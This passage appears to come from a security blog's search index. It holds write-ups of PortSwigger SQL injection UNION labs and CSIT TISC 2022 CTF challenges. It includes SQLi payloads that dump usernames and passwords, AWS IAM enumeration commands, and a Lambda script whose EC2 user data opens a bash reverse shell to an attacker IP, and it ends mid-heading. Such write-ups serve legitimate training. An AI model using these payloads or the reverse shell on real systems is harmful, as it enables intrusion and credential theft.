Generic_UnionSelect.txt.</li> <li>To fuzz for UNION based SQLi, we will use burp intruder.</li> <li>However, there is some additions we need to make to the <code>UNION SELECT</code> wordlist based on the recommendations by Hacktricks : </li> </ul> <p>You should use <code>null</code> values as in some cases the type of the columns of both sides of the query must be the same and <code>null</code> is valid in every case.</p> <pre><code>1' UNION SELECT null-- - Not working\n1' UNION SELECT null,null-- - Not working\n1' UNION SELECT null,null,null-- - Worked\n</code></pre> <ul> <li>Hence the above payload should also be added to the test payload.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#testing-view-details","title":"Testing \"View Details\"","text":"<ul> <li>Based on the results above all requests meets with <code>error 400</code> response, it seems like <code>product?productId=&lt;number&gt;</code> is not vulnerable to SQL injection.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#testing-category-filter","title":"Testing \"Category Filter\"","text":"<ul> <li>There are <code>200 OK</code> response as well as <code>error 500</code>. Hence it seems like this might be the vulnerable function.</li> <li>We filter for the <code>200 OK</code> responses and check the response results. </li> <li>Reponse if false would be empty.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#sql-injection-union-attack-finding-a-column-containing-text","title":"SQL injection UNION attack, finding a column containing text","text":"<ul> <li>As this exercise builds on the previous exercise \"#SQL injection UNION attack determining the number of columns returned by the query\", we will skip the Application Mapping Phase and move straight to the vulnerablity assessment and exploitation phase.</li> <li>The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>First off we will use burp intruder and the fuzzing list we used above to find out the number of columns that is returned by the query.</li> </ul> <ul> <li>As can be seen above after filtering for <code>200 OK</code> responses only <code>NULL,NULL,NULL</code> returns to us with the correct response. Hence we know that there are 3 columns. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#exploitation","title":"Exploitation","text":"<ul> <li>Now that we know that there are 3 columns in the table, we will now need to find which column contain text and to do so we will need to fuzz with a string variable in the parameter. The payload used is like below : </li> </ul> <ul> <li>As can be seen below, only <code>'UNION SELECT NULL,'a',NULL</code> gives a <code>200 OK</code> response and value <code>'a'</code> is included in the table.</li> </ul> <ul> <li>We use the string that is required to solve the lab \"TARkG7\" and lab is solved.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#sql-injection-union-attack-retrieving-data-from-other-tables","title":"SQL injection UNION attack, retrieving data from other tables","text":"<ul> <li>This lab builds on the above 2 labs and hence, we will skip the application mapping phase and move straight to attacking SQL injection.</li> <li>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the <code>administrator</code> user. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#vulnerability-assessment_1","title":"Vulnerability Assessment","text":"<ul> <li> <p>We will now test if the query is SQL injectable using Burp Intruder.  </p> </li> <li> <p>We will then test for the columns that can hold strings and it seems like both the columns in the table can hold string data.</p> </li> </ul> <p> </p>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#database-enumeration","title":"Database Enumeration","text":"<ul> <li>After assessing that the query is vulnerable to SQLi, we will now need to go retrieve information from the database. </li> <li>However, we will need certain information like the type of databse used the tables in the database, the columns in the table of interest. Hence the following enumeration steps needs to be done.</li> <li>We will be using this cheatsheet to formulate our payloads for enumeration.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-database-version","title":"Enumerating Database Version","text":"<ul> <li>To conduct any exploit, we will need to know the database version as it will determine the query language that is used.</li> </ul> <ul> <li>We run through all the possible query languages for the database version and found out that this database uses postgreSQL.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-tables","title":"Enumerating Tables","text":"<ul> <li>Using the PostgreSQL documentation we came up with the following payload. This payload will retrieve table name and table type from information schema. </li> <li>So that we can find out what are the tables that are available in this database.</li> </ul> <pre><code>' UNION SELECT table_name,table_type FROM information_schema.tables --\n</code></pre> <ul> <li>As can be seen below, we see a table that does not seem to be default called \"users\".</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-columns","title":"Enumerating Columns","text":"<ul> <li>We then try to find out what are the columns in the users table and we use the following payload below : </li> </ul> <pre><code>' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name = 'users' --\n</code></pre> <ul> <li>As can be seen, there are only 2 columns 'username' and 'password'.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#exploitation_1","title":"Exploitation","text":"<ul> <li>Hence to exploit this we will retrieve all the rows in the columns by using the following payload.</li> </ul> <pre><code>' UNION SELECT username,password FROM users --\n</code></pre>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column","title":"SQL injection UNION attack, retrieving multiple values in a single column","text":"<ul> <li>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. </li> <li>The following list of payloads were derived from previous exercises :</li> </ul> <pre><code>' UNION SELECT null--\n' UNION SELECT null,null--\n' UNION SELECT null,null,null --\n\n' UNION SELECT banner FROM v$version --\n' UNION SELECT null,banner FROM v$version --\n' UNION SELECT banner,null FROM v$version--\n' UNION SELECT null,null,banner FROM v$version--\n' UNION SELECT null,,banner,null FROM v$version--\n' UNION SELECT ,banner,null,null FROM v$version--\n\n' UNION SELECT @@version --\n' UNION SELECT null,@@version --\n' UNION SELECT @@version,null--\n' UNION SELECT null,null,@@version--\n' UNION SELECT null,@@version,null--\n' UNION SELECT @@version,null,null--\n\n' UNION SELECT version()--\n' UNION SELECT null,version()--\n' UNION SELECT version(),null--\n' UNION SELECT null,null,version()--\n' UNION SELECT null,version(),null--\n' UNION SELECT version(),null,null--\n</code></pre>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#vulnerability-assessment_2","title":"Vulnerability Assessment","text":"<ul> <li>We use burp intruder and the paylaod above to check SQLi, the number of columns that is displayed and the column that allows for string.</li> </ul> <ul> <li>From the results, above, we filter for <code>200 OK</code> responses and found out that there are only 2 columns and the second column is the one that can accept strings.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#database-enumeration_1","title":"Database Enumeration","text":""},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-database-version_1","title":"Enumerating Database Version","text":"<ul> <li>In the same burp intruder \"attack\", we also injected various kind of \"version\" to enumerate the database version. From the enumeration, we know that PostgreSQL is used.</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-tables-in-database","title":"Enumerating Tables in Database","text":"<ul> <li>After ascertaining database version, we send the payload below to enumerate the schema to check for non-default tables. We have to use string concatenation as only one column is available. </li> </ul> <pre><code>' UNION SELECT null,table_name||'-'||table_type FROM information_schema.tables--\n</code></pre> <ul> <li>We found that there is an interesting \"users\" table that is non-default. </li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#enumerating-columns-in-users-table","title":"Enumerating Columns in \"users\" Table","text":"<ul> <li>We then continued to enumerate the columns that are in the \"users\" table with the payload below. </li> </ul> <pre><code>' UNION SELECT null,column_name || '-' || data_type FROM information_schema.columns WHERE table_name = 'users' --\n</code></pre> <ul> <li>We find out that there are only two columns in the \"users\" table - \"password\" and \"username\"</li> </ul>"},{"location":"Burp_Academy/Practitioner/SQL%20Injection%20UNION%20Attack/#exploitation_2","title":"Exploitation","text":"<ul> <li>We finish by using the payload below to enumerate all the rows in the username and password columns.</li> </ul> <pre><code>' UNION SELECT null, username || '-' || password FROM users --\n</code></pre> <ul> <li>As can be seen below, we get the username and passwords of <code>administrator</code>.</li> </ul> <ul> <li>We logged into the administrator account to finish the challenge.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/","title":"CSIT TISC 2022 (1)","text":""},{"location":"CTF/TISC%202022%20%281%29/#level-1-slay-the-dragon","title":"Level 1 : Slay The Dragon","text":"<p>The recently launched online RPG game \"Slay The Dragon\" has been hot topic in the online gaming community of late, due to a seemingly impossible final boss. Amongst the multiple tirades against the forementioned boss, much controversy has been brewing due to rumors of the game being a recruitment campaign for PALINDROME, the cybercriminal organisation responsible for recent cyberattacks on Singapore's critical infrastructure.</p> <p>You are tasked to find a way to beat (hack) the game and provide us with the flag (a string in the format TISC{xxx}) that would be displayed after beating the final boss. Your success is critical to ensure the safety of Singapore's cyberspace, as it would allow us to send more undercover operatives to infiltrate PALINDROME.</p> <p>To aid in your efforts, we have managed to obtain the source code of the game for you. We look forward to your success! </p>"},{"location":"CTF/TISC%202022%20%281%29/#recon","title":"Recon","text":"<ul> <li>In the initial stage of my recon, I will attempt to map out what the visible functions are by connecting directly and playing the game.</li> </ul> <pre><code>./client_linux_x64 --host chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg --port 18261\n</code></pre>"},{"location":"CTF/TISC%202022%20%281%29/#main-page","title":"Main Page","text":"<ul> <li>From the Main Page Below, we can see that there is only 3 functions we can do : #Fight Boss, #Mine Gold and #Go Shopping.</li> <li>We can also see the Player stats from the Main Page.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#fight-boss","title":"Fight Boss","text":"<ul> <li>So I shall attempt to fight the boss straight away and I realised that there is an impossible boss to beat \"Dragon\".</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#mine-gold","title":"Mine Gold","text":"<ul> <li>In the Mine Gold function I find out that after every \"Mining\" activity, the amount of Gold </li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#go-shopping","title":"Go Shopping","text":""},{"location":"CTF/TISC%202022%20%281%29/#battleeventpy","title":"battleevent.py","text":""},{"location":"CTF/TISC%202022%20%281%29/#battleservicepy","title":"battleservice.py","text":""},{"location":"CTF/TISC%202022%20%281%29/#commandpy","title":"command.py","text":""},{"location":"CTF/TISC%202022%20%281%29/#workeventpy","title":"workevent.py","text":""},{"location":"CTF/TISC%202022%20%281%29/#exploitation","title":"Exploitation","text":"<ul> <li>Therefore from the above code, we can see that in battleservice.py has a function <code>__compute_battle_outcome()</code> which will iterate through the variable <code>command</code> and count the number of <code>BOSS_ATTACK</code>, <code>ATTACK</code> and <code>HEAL</code>. </li> <li>From Line 28 of <code>battleservice.py</code> <code>self.history.log_commands_from_str(self.server.recv_command_str())</code> we know that the server receives the command sent by the client as string and these commands are interpreted in the file <code>command.py</code> which is within the <code>/src/core/models</code></li> <li>Hence all that we need to do is to send 100 \"ATTACK\" strings in one <code>Command.ATTACK</code> and we will be able to beat the last boss - \"Dragon\". </li> <li>This can be done by modifying the <code>ATTACK</code> variable in the <code>Command()</code> class like below.</li> </ul> <ul> <li>Next we will need to modify battleevent.py accordingly so that the number of \"ATTACKs\" done will be reflected on client side which will then be validated.</li> </ul> <ul> <li>Now we will proceed to fighting the last boss and as can be seen, because we overpowered the previous bosses, our health remains full.</li> </ul> <ul> <li>From below, we won the final boss and we got out flag!</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#level-2-leaky-matrices","title":"Level 2 : Leaky Matrices","text":"<p>Looks like PALINDROME implemented their own authentication protocol and cryptosystem to provide a secure handshake between any 2 services or devices. It does not look secure to us, can you take a look at what we have got?</p>"},{"location":"CTF/TISC%202022%20%281%29/#understanding-protocol","title":"Understanding Protocol","text":"<ul> <li>The three main takeaways are as below.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#exploitation_1","title":"Exploitation","text":"<ul> <li>Hence the secret keys can be leaked in the \"Challenge Me\" phase, where we will have to reverse the <code>AND</code> operation first then reverse the matrix multiplication with the response and challenge to obtain the secret.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#leaking-secret_key","title":"Leaking SECRET_KEY","text":"<ul> <li>Basing on the image of the sample implementation, we copy the important functions to test the properties of matrix.</li> </ul> <pre><code>import sys\nimport numpy as np\n\ndef sysout(fstr):\n   sys.stdout.write(fstr)\n   sys.stdout.flush()\n\ndef vectostr(v):\n   return \"\".join(map(str,v.reshape(-1)))\n\ndef strtovec(s, rows=8, cols=1):\n   return np.fromiter(list(s),dtype=\"int\").reshape(rows,cols)\n\nSECRET_KEY = np.round(np.random.rand(8,8)).astype(\"int\")\n\nif __name__ == \"__main__\":\n   print(SECRET_KEY)\n\n   print(\"Challenge Me\")\n   for i in range(8):\n      input_vec = input(f\"Challenge Me #{i} &lt;-- \")\n      assert len(input_vec) == 8\n      assert input_vec.count(\"1\") + input_vec.count(\"0\") == 8\n      input_vec = strtovec(input_vec)\n      #print(input_vec) \n      output_vec = (SECRET_KEY @ input_vec)\n      sysout(f\"My Response --&gt; {vectostr(output_vec)}\\n\")\n      output_vec = (SECRET_KEY @ input_vec)&amp;1\n      sysout(f\"My Response --&gt; {vectostr(output_vec)}\\n\")\n</code></pre>"},{"location":"CTF/TISC%202022%20%281%29/#sending-payload-challenges","title":"Sending Payload Challenges","text":"<pre><code>1 0 1 0 1 0 0 1\n1 0 1 0 0 1 1 0\n1 1 1 1 0 0 1 1\n0 0 1 0 1 0 0 0\n0 0 1 0 0 1 1 1\n1 0 1 0 0 1 1 0\n1 1 1 0 1 1 1 1\n0 0 0 0 0 1 1 1\n</code></pre> <pre><code>import sys\nimport numpy as np\n\ndef sysout(fstr):\n   sys.stdout.write(fstr)\n   sys.stdout.flush()\n\ndef vectostr(v):\n   return \"\".join(map(str,v.reshape(-1)))\n\ndef strtovec(s, rows=8, cols=1):\n   return np.fromiter(list(s),dtype=\"int\").reshape(rows,cols)\n\nSECRET_KEY = np.matrix('1 0 1 0 1 0 0 1;1 0 1 0 0 1 1 0;1 1 1 1 0 0 1 1;0 0 1 0 1 0 0 0;0 0 1 0 0 1 1 1;1 0 1 0 0 1 1 0;1 1 1 0 1 1 1 1;0 0 0 0 0 1 1 1')\n\nif __name__ == \"__main__\":\n   print(SECRET_KEY)\n   input2 = input(f\"Challenge &lt;-- \")\n   input2 = strtovec(input2)\n#   output = (SECRET_KEY@input2)\n#   sysout(f\"Answer --&gt; {vectostr(output)}\\n\")\n   output = (SECRET_KEY@input2)&amp;1\n   sysout(f\"Answer --&gt; {vectostr(output)}\\n\")\n</code></pre>"},{"location":"CTF/TISC%202022%20%281%29/#level-3-patient0-part-1","title":"Level 3 : Patient0 - Part 1","text":"<p>Palindrome has spread some virus to corrupt machines causing incorrect readings in patients' health measurements and rending them unusable. Inspect the file and see if you can uncover the 8 corrupted bytes that renders the file system unusable? </p>"},{"location":"CTF/TISC%202022%20%281%29/#recon_1","title":"Recon","text":"<ul> <li>Using File we realise that this file is a NTFS drive.</li> </ul> <ul> <li>We first repair drive with test disk.</li> </ul> <pre><code>testdisk PATIENT0\n</code></pre> <ul> <li>Then we compare the unrepaired file with the repaired file.</li> </ul> <pre><code>xxd PATIENT0 &gt; PATIENT0.hex\nxxd PATIENT0_repaired &gt; PATIENT0_repaired.hex\ndiff PATIENT0.hex PATIENT0_repaired.hex\n</code></pre> <ul> <li>We can tell that the 8 continuous bytes that was changed was <code>f766 35ab</code> therefore the flag for this challenge is <code>TISC{f76635ab}</code>.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#level-3-patient-0-part-2","title":"Level 3 : PATIENT 0 - Part 2","text":"<p>Palindrome must have leaked one of their passwords as the 4 corrupted bytes (Part 1 flag)! Dig deeper to find what was hidden! </p>"},{"location":"CTF/TISC%202022%20%281%29/#hints","title":"Hints","text":""},{"location":"CTF/TISC%202022%20%281%29/#recon_2","title":"Recon","text":"<ul> <li>In the Recon stage, we look around the repaired file systems for clues as stated in the hints and the following clues were found : #message png, #message png ADS, #broken pdf.</li> </ul>"},{"location":"CTF/TISC%202022%20%281%29/#messagepng","title":"message.png","text":""},{"location":"CTF/TISC%202022%20%281%29/#messagepng-ads","title":"message.png ADS","text":""},{"location":"CTF/TISC%202022%20%281%29/#brokenpdf","title":"broken.pdf","text":""},{"location":"CTF/TISC%202022%20%281%29/#unlocking-outer","title":"Unlocking Outer","text":"<ul> <li>Taking the ADS <code>$RAND</code> we removed the clue strings with hex editors and proceeded to mount the file with TrueCrypt (derived from the clue and hints) and used the flag for #Level 3 Patient0 - Part 1 as password.</li> </ul> <ul> <li>The mounting was successful as can be seen above and we see an image file below.</li> </ul> <ul> <li>Following this link and the below comment : </li> </ul> <ul> <li>Following the instructions above we get the following : </li> </ul> <ul> <li>As can be seen, there is a hash collision that resembles what clue 4 has given : <code>c01lis1on</code>. With this as password, we managed to unlock the hidden compartment of the encrypted volume,</li> </ul> <ul> <li>There is a <code>flag.ppsm</code> file (macro-enabled powerpoint) and it corresponds with the <code>PK</code> header which stands for ZIP or compressed format - Powerpoint files are a kind of zipped files.</li> </ul> <ul> <li>Using 7zip, we unzipped the ppsm file and we checked Media to see if there is any media within the powerpoint.</li> </ul> <ul> <li>We opened one of the images and it says to get a <code>MD5</code> hash of the sound clip to get the flag. </li> </ul> <ul> <li>We get the hash of the sound clip with certutil and the result is below : </li> </ul> <pre><code>Flag : TISC{f9fc54d767edc937fc24f7827bf91cfe}\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/","title":"CSIT TISC 2022 (2)","text":""},{"location":"CTF/TISC%202022%20%282%29/#level-4a-one-knock-away-attempted-but-did-not-complete","title":"Level 4a : One Knock Away [attempted but did not complete]","text":"<p>One of our clients' server was recently compromised by PALINDROME. We recovered one suspicious artifact from the server. Can you figure out what it is? (The file can only be loaded in a specific VM!) </p>"},{"location":"CTF/TISC%202022%20%282%29/#basic-static-analysis","title":"Basic Static Analysis","text":"<ul> <li>For the basic static analysis above, Detect-It-Easy, linux <code>file</code> and <code>readelf</code> command was used. </li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#file-classification","title":"File Classification","text":"<ul> <li>We can gather a few information, this is a :  <ul> <li>64-bit ELF file for Ubuntu 20.04.1, </li> <li>likely not packed </li> <li>the <code>REL</code> flag set (relocatable file) more on the differences can be found here.</li> </ul> </li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#looking-into-dynsym","title":"Looking into <code>.dynsym</code>","text":"<ul> <li>Following this blog we focused our search on the following 3 symbol types.</li> </ul> <pre><code>readelf -s | grep -i 'func'\nreadelf -s | grep -i 'object'\nreadelf -s | grep -i 'file'\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#strings","title":"Strings","text":""},{"location":"CTF/TISC%202022%20%282%29/#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li>The author CY1603 has been nice by putting a <code>dont_need_to_reverse_this</code> and hence we will do what the author has told us to. We will also not be reversing <code>dffqa</code> and <code>print_flag</code> as they seem to just be worker functions for <code>dont_need_to_reverse_this</code>.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#init_module-cleanup_module","title":"init_module &amp;&amp; cleanup_module","text":""},{"location":"CTF/TISC%202022%20%282%29/#hook_func","title":"hook_func","text":"<p>[too long to display]</p>"},{"location":"CTF/TISC%202022%20%282%29/#ppyq","title":"ppyq","text":""},{"location":"CTF/TISC%202022%20%282%29/#level-4b-cloudynekos","title":"Level 4b : CloudyNekos","text":"<p>We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.</p> <p>We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.</p> <p>Start here: http://d20whnyjsgpc34.cloudfront.net </p>"},{"location":"CTF/TISC%202022%20%282%29/#recon","title":"Recon","text":""},{"location":"CTF/TISC%202022%20%282%29/#mapping-visible-content","title":"Mapping Visible Content","text":""},{"location":"CTF/TISC%202022%20%282%29/#content-exploration","title":"Content Exploration","text":"<ul> <li>Based on the comment found above, we can guess the address of the S3 bucket to be : <code>palindromecloudynekos.s3.amazonaws.com</code></li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#looking-for-hidden-content","title":"Looking for Hidden Content","text":""},{"location":"CTF/TISC%202022%20%282%29/#feroxbuster","title":"Feroxbuster","text":"<pre><code>feroxbuster -u https://d20whnyjsgpc34.cloudfront.net/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o big_ferox -x html\n</code></pre> <ul> <li>Nothing interesting was found, just the error page and <code>/soap</code> is likely the API endpoint to call the S3 bucket.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#s3-bucket-enumeration","title":"S3 Bucket Enumeration","text":"<ul> <li>Following this guide we will need to install aws-cli on our Kali machine first then create an AWS account and generate a secret key before proceeding with below. </li> <li>Next we list the content of the bucket using the following command: </li> </ul> <pre><code>aws s3 ls s3://palindromecloudynekos\n</code></pre> <ul> <li>Then we want to see what objects are in the folders</li> </ul> <pre><code>aws s3api list-objects --bucket palindromecloudynekos\n</code></pre> <pre><code>{\n    \"Contents\": [\n        {\n            \"Key\": \"api/notes.txt\",\n            \"LastModified\": \"2022-08-23T13:16:20.000Z\",\n            \"ETag\": \"\\\"b65f26503b0dd488334582aa21f7bda4\\\"\",\n            \"Size\": 432,\n            \"StorageClass\": \"STANDARD\"\n        },\n        {\n            \"Key\": \"error.html\",\n            \"LastModified\": \"2022-08-23T13:16:20.000Z\",\n            \"ETag\": \"\\\"9771d7ba5b393dcef59ddb260cecc6bc\\\"\",\n            \"Size\": 34,\n            \"StorageClass\": \"STANDARD\"\n        },\n        {\n            \"Key\": \"img/photo1.jpg\",\n            \"LastModified\": \"2022-07-22T10:02:45.000Z\",\n            \"ETag\": \"\\\"9e620e851f5fae15e5637cc914548406\\\"\",\n            \"Size\": 404845,\n            \"StorageClass\": \"STANDARD\"\n        },\n        ...\n        {\n            \"Key\": \"index.html\",\n            \"LastModified\": \"2022-08-23T13:16:20.000Z\",\n            \"ETag\": \"\\\"b299661e57fff70507663e91f2958410\\\"\",\n            \"Size\": 2257,\n            \"StorageClass\": \"STANDARD\"\n        }\n    ]\n}\n</code></pre> <ul> <li><code>/api/notes.txt</code> looks particularly interesting, so we will attempt to download it with the aws-cli. The content of notes.txt is shown below.</li> </ul> <pre><code>aws s3api get-object --bucket palindromecloudynekos --key api/notes.txt notes.txt\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#understanding-notestxt","title":"Understanding <code>notes.txt</code>","text":"<ul> <li>To understand notes.txt, we must first know what the link <code>https://b40yqpyjb3.execute-api.ap-southeast-1.amazonaws.com/prod/agent</code> is about. </li> <li>We noticed a 'execute-api' and began to searched the AWS documentation. From, the documentation we know that the above link is a REST API Invocation of Amazon API Gateway. </li> <li>This corresponds to the content in notes.txt about invoking the API. We then invoked the API as per instruction and we get the follwing request.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#scout-suite-enumeration","title":"Scout Suite Enumeration","text":"<pre><code>scout aws --access-key-id &lt;access key&gt; --secret-access-key &lt;secret key&gt;\n</code></pre> <ul> <li>We noticed an interesting VPC with the name palindrome.</li> </ul> <ul> <li>The command below is based on this stackoverflow thread, confirms that the palindrome VPC has an internet gateway.</li> </ul> <pre><code>aws ec2 describe-route-tables  --query \"RouteTables[].Routes[]\" --filter Name=association.subnet-id,Values=subnet-0aa6ecdf900166741\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#permission-enumeration","title":"Permission Enumeration","text":"<ul> <li>With reference to this guide, we start with enumerating the permissions of this account. In this enumeration we cross referenced with 3 different sources - #enumerate-iam, #Pacu iam__enum_permissions and #Pacu iam__bruteforce_permissions to get a list of permissions found in #Consolidated Permissions Enumerated.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#enumerate-iam","title":"enumerate-iam","text":"<ul> <li>Using the tool enumerate-iam, we attempted to bruteforce</li> </ul> <pre><code>python enumerate-iam.py --access-key ACCESS_KEY --secret-key SECRET_KEY --region ap-southeast-1\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#pacu-iam__bruteforce_permissions","title":"Pacu <code>iam__bruteforce_permissions</code>","text":"<ul> <li>We used the tool pacu by RhinoSecurityLabs to do an additional bruteforce on IAM permissions.</li> </ul> <pre><code>run iam__bruteforce_permissions\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#pacu-iam__enum_permissions","title":"Pacu <code>iam__enum_permissions</code>","text":"<pre><code>run iam__enum_permissions\nwhoami\n</code></pre> <ul> <li>These are the additional permissions that were enumerated.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#roles-permission-enumeration","title":"Roles Permission Enumeration","text":"<ul> <li>Based on the result of Pacu's <code>iam__enum_permissions</code> , we can see that current user has <code>iam:PassRole</code> to <code>lambda_agent_development_role</code> Hence we will need to find out more about the role and it's permission.</li> </ul> <pre><code># to get policy-arn\naws iam list-attached-role-policies --role-name lambda_agent_development_role --profile temp\n\naws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_lambda_agent_development_role --version-id v2 --profile temp\n</code></pre> <ul> <li>Then we see that there is another PassRole to </li> </ul> <pre><code>aws iam list-attached-role-policies --role-name ec2_agent_role --profile temp\n\naws iam get-policy-version --policy-arn arn:aws:iam::051751498533:policy/iam_policy_for_ec2_agentrole --version-id v2 --profile temp\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#consolidated-permissions-enumerated","title":"Consolidated Permissions Enumerated","text":"<ul> <li>The results from both were largely similar but as the list used in enumeration is different, there are some differences.</li> <li>Below is the consolidated permissions of all the related roles.</li> </ul> <pre><code>###### Compromised User\n#ec2\ndescribe-instance-types\ndescribe-regions\ndescribe-route-tables\ndescribe-security-groups\ndescribe-subnets\ndescribe-vpcs\nget-associated-enclave-certificate-iam-roles\nget-console-screenshot\nget-host-reservation-purchase-preview\n\n#s3\nget-object-torrent\nhead-bucket\nls s3://&lt;bucket_name&gt;\n\n#sts\nget-caller-identity\nget-session-token\n\n#iam\nlist-roles\nlist-instance-profiles\nget-policy\nget-policy-version\nlist-attached-role-policies\nlist-attached-user-policies\npass-role\n\n#dynamodb\ndescribe-endpoints\n\n#s3api\nlist-objects\nget-object\n\n#lambda\ninvoke-function\ncreate-function\nget-function\n</code></pre> <pre><code>###### lambda_agent_development_role\n#ec2\nrun-instances\ncreate-volume\ncreate-tags\n\n#iam\nPassRole\n\n#lambda\nget-function\n</code></pre> <pre><code>###### ec2_agent_role\n#dynamodb\ndescribe-table\nlist-tables\nscan\nquery\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#formulating-attack-chain","title":"Formulating Attack Chain","text":"<ul> <li>From our enumeration above and reference to hackingthe.cloud, it seems like our compromised user can create an EC2 Instance by making use of the lambda function with which we can get the AWS Access and Secret Key of the role <code>ec2_agent_role</code> from <code>169.254.169.254/metadata/latest</code> and then get to Dynamo DB with the credentials.</li> </ul>"},{"location":"CTF/TISC%202022%20%282%29/#lambda-script-to-create-ec2-instance","title":"Lambda Script to Create EC2 Instance","text":"<ul> <li>The python script below is used to create an EC2 instance with lambda. </li> <li>In this script below, we added an <code>init_scipt</code> to tell the </li> </ul> <p><code>IamInstanceProfile</code> is very Important here as it is required to get access to the IAM role. Without it, the instance will still be created, but it will not be attached to a role and we will not have this page <code>/latest/meta-data/iam/</code>.</p> <p>\"Open Source\" AMI Image Id like Amazon Linux and Ubuntu AMIs are uniformed across all users and we can get it by :  1. Registering an AWS account and look for it at the create EC2 form. 2. Referencing AWS AMI page or Ubuntu Cloud Images page.</p> <pre><code>import boto3\n\nREGION = 'ap-southeast-1' \nAMI = 'ami-08569b978cc4dfa10'\nINSTANCE_TYPE = 't2.micro'\nSUBNET_ID = 'subnet-0aa6ecdf900166741'\n\nEC2 = boto3.client('ec2', region_name=REGION)\n\ndef lambda_handler(event, context):\n    init_script = \"\"\"#!/bin/bash\n                   bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/8080 0&gt;&amp;1                \n    \"\"\"\n\n    instance = EC2.run_instances(\n        ImageId=AMI,\n        InstanceType=INSTANCE_TYPE,\n        SubnetId=SUBNET_ID,\n        MinCount=1, \n        MaxCount=1,\n        TagSpecifications=[{'ResourceType': 'instance','Tags': [{\"Key\": \"agent\", \"Value\": \"user-9d084cfc30dc44a8b84e9cfe79007c72\"}]}],\n        UserData=init_script\n        IamInstanceProfile={'Arn': 'arn:aws:iam::051751498533:instance-profile/ec2_agent_instance_profile'},\n    )\n\n    print(\"New instance created.\")\n    instance_id = instance['Instances'][0]['InstanceId']\n    print(instance_id)\n\n    return instance_id\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#creating-and-invoking-lambda","title":"Creating and Invoking Lambda","text":"<ul> <li>Based on the permissions above, the compromsed user only has permissions to create and invoke lambda resources with the following name <code>arn:aws:lambda:ap-southeast-1:&lt;account id&gt;:function:$(aws:username)-*</code> hence we will need to create a function with function name <code>&lt;username&gt;-&lt;own function name&gt;</code></li> </ul> <pre><code>aws lambda create-function --function-name &lt;username&gt;-SI --role arn:aws:iam::&lt;account-id&gt;:role/lambda_agent_development_role --runtime python3.9 --handler &lt;name of file&gt;.&lt;handler&gt; --profile temp --zip-file fileb://SI.py.zip\n</code></pre> <ul> <li>After creating the lambda functin above, we can now invoke the lambda function with the following command : </li> </ul> <pre><code>aws lambda invoke --function-name &lt;username&gt;-SI outfile --profile temp\n</code></pre>"},{"location":"CTF/TISC%202022%20%282%29/#getting-reverse-shell","title":"Getting Reverse 